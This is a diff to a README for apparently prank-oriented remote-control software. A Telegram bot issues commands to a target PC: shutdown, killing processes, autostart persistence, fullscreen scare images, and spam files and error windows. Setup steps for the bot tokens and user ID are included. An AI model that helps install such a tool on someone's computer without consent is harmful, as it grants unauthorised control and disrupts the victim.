@@ -22,15 +22,18 @@ This code accepts various commands from you through the Telegram bot and execute
 - Command: /shutdown /off | Arguments: no required | Example: /shutdown | Function: Shutdown PC. | Settings: No.
 - Command: /scream /fullscreen | Arguments: no required | Example: /scream | Function: Open image on fullscreen. | Settings: no.
 - Command: /mouse /movemouse | Arguments: no required | Example: /mouse | Function: Move mouse in different directions. | Settings: No.
--  Command: /proc /processes | Arguments: no required | Example: /proc | Function: Send you table with all processes on PC.
--  Command: /kill | Arguments: number (process PID) | Example: /kill 1337 | Function: Kill process by PID. | Settings: No.
--  Command: /autostart /as | Arguments: no required | Example: /as | Function: add program to PC autostart.
+- Command: /proc /processes | Arguments: no required | Example: /proc | Function: Send you table with all processes on PC.
+- Command: /kill | Arguments: number (process PID) | Example: /kill 1337 | Function: Kill process by PID. | Settings: No.
+- Command: /autostart /as | Arguments: no required | Example: /as | Function: add program to PC autostart.
+- Command: /spamdesktop /sd | Arguments: Files title, Files content, count files | Example: /sd test hello 5 | Function: Creating .txt files on desktop. | Settings: No.
+- Command: /spammessage /smb | Arguments: Error title, Error content, count errors | Example: /smb test hello 10 | Function: Writing windows with errors. | Settings: No.
 
 ### Setting up
 ##### Telegram
 Open your telegram and in search enter: @BotFather and create two bots following instructions.
 ##### Config
 Open config.py file after select your language. And replace "yourtroll:tokenbot" on token from BotFather. Also replace "yourtroll:watchdogtoken" on token watchdogbot from BotFather.
+Find your telegram UserID in telegram search @getmyid_bot and write her in USERID.
 Next write name of audio files in MUSIC1, MUSIC2, MUSIC3 and select music duration in DELAYMUSIC.
 Write path to images wallpapers for replace in WALLPAPER1, WALLPAPER2, WALLPAPER3.
 Write name of image file for open on fullscreen in SCREAMIMAGENAME.
